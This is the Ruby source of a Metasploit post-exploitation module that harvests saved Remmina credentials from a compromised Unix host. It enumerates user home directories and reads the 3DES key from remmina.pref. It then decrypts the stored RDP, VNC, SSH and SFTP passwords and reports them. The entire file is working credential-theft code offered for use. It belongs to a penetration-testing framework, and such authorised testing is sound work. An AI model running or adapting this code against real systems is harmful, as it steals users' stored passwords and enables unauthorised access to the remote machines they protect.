# encoding: UTF-8
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'UNIX Gather Remmina Credentials',
                      'Description'   => %q(
                        Post module to obtain credentials saved for RDP and VNC
                        from Remmina's configuration files.  These are
                        encrypted with 3DES using a 256-bit key generated by
                        Remmina which is (by design) stored in (relatively)
                        plain text in a file that must be properly protected.
                       ),
                      'License'       => MSF_LICENSE,
                      'Author'        => ['Jon Hart <jon_hart[at]rapid7.com>'],
                      'Platform'      => %w(bsd linux osx unix),
                      'SessionTypes'  => %w(shell meterpreter)
      ))
  end

  def run
    creds = extract_all_creds
    if creds.empty?
      print_status('No Reminna credentials collected')
    else
      creds.each do |cred|
        report_auth_info(cred)
      end
      print_good("Collected #{creds.size} sets of Remmina credentials")
    end
  end

  def decrypt(secret, data)
    c = OpenSSL::Cipher::Cipher.new('des3')
    key_data = Base64.decode64(secret)
    # the key is the first 24-bytes of the secret
    c.key = key_data[0,24]
    # the IV is the last 8 bytes of the secret
    c.iv = key_data[24,8]
    # passwords less than 16 characters are padded with nulls
    c.padding = 0
    c.decrypt
    p = c.update(Base64.decode64(data))
    p << c.final
    # trim null-padded, < 16 character passwords
    p.gsub(/\x00*$/, '')
  end

  # Extracts all remmina creds found anywhere on the target
  def extract_all_creds
    creds = []
    user_dirs = enum_user_directories
    if user_dirs.empty?
      print_error('No user directories found')
    else
      vprint_status("Searching for Remmina creds in #{user_dirs.size} user directories")
      # walk through each user directory
      enum_user_directories.each do |user_dir|
        remmina_dir = ::File.join(user_dir, '.remmina')
        pref_file = ::File.join(remmina_dir, 'remmina.pref')
        next unless file?(pref_file)

        vprint_status("Extracting secret key from #{pref_file}")
        remmina_prefs = get_settings(pref_file)
        if remmina_prefs.empty?
          print_error("Unable to extract Remmina settings from #{pref_file}")
          next
        end

        secret = remmina_prefs['secret']
        if secret
          vprint_good("Extracted secret #{secret} from #{pref_file}")
        else
          print_error("No Remmina secret key found in #{pref_file}")
          next
        end

        # look for any  \d+\.remmina files which contain the creds
        cred_files = []
        dir(remmina_dir).each do |entry|
          if entry =~ /^\d+\.remmina$/
            cred_files << ::File.join(remmina_dir, entry)
          end
        end

        if cred_files.empty?
          vprint_status("No Remmina credential files in #{remmina_dir}")
        else
          creds |= extract_creds(secret, cred_files)
        end
      end
    end
    creds
  end

  def extract_creds(secret, files)
    creds = []
    files.each do |file|
      settings = get_settings(file)
      if settings.empty?
        print_error("No settings found in #{file}")
        next
      end

      # get protocol, host, user
      proto = settings['protocol']
      host = settings['server']
      case proto
      when 'RDP'
        port = 3389
        user = settings['username']
      when 'VNC'
        port = 5900
        domain = settings['domain']
        if domain.blank?
          user = settings['username']
        else
          user = domain + '\\' + settings['username']
        end
      when 'SFTP', 'SSH'
        user = settings['ssh_username']
        port = 22
      else
        print_error("Unsupported protocol: #{proto}")
        next
      end

      # get the password
      encrypted_password = settings['password']
      if encrypted_password.blank?
        # in my testing, the box to save SSH passwords was disabled.
        password = nil
      else
        password = decrypt(secret, encrypted_password)
      end

      if host && user
        creds <<
          {
            # this fails when the setting is localhost (uncommon, but it could happen) or when it is a simple string.  huh?
            # :host   => host,
            :host =>  session.session_host,
            :port   => port,
            :sname  => proto.downcase,
            :user   => user,
            :pass   => password,
            :active => true
          }
      else
        print_error("Didn't find host and user in #{file}")
      end
    end
    creds
  end

  def get_settings(file)
    settings = {}
    read_file(file).split("\n").each do |line|
      if line =~ /^\s*([^#][^=]+)=(.*)/
        settings[Regexp.last_match(1)] = Regexp.last_match(2)
      end
    end
    settings
  end
end
